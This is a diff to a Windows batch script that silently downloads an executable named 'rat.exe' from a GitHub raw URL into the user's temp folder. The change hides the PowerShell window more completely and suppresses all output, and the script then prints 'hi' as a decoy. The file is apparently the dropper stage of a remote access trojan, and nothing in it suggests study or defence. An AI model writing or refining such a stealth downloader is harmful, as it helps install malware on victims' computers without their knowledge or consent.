@@ -1,7 +1,7 @@
 @echo off
 
-:: Hide PowerShell execution window while downloading the file
-powershell -Command "Start-Process powershell -ArgumentList 'Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe' -WindowStyle Hidden" 
+:: Hide PowerShell execution completely
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe" >nul 2>&1
 
 :: Display "hi" message
 echo hi
